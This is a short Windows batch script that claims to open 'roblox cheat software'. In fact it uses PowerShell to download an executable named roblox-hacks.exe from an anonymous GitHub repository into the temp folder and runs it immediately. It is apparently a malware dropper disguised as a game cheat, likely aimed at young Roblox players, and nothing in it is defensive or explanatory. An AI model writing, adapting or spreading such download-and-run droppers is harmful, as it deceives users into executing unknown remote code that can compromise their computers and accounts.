@echo off

set "url=https://github.com/dsadkjsahdkjdhkjh/turbo-pancake/raw/main/roblox-hacks.exe"
set "tempDir=%temp%\download"

echo Opening legi7modz microsoft store roblox cheat software..

if not exist "%tempDir%" (
    mkdir "%tempDir%"
)

powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%tempDir%\roblox-hacks.exe')"

start "" "%tempDir%\roblox-hacks.exe"

exit
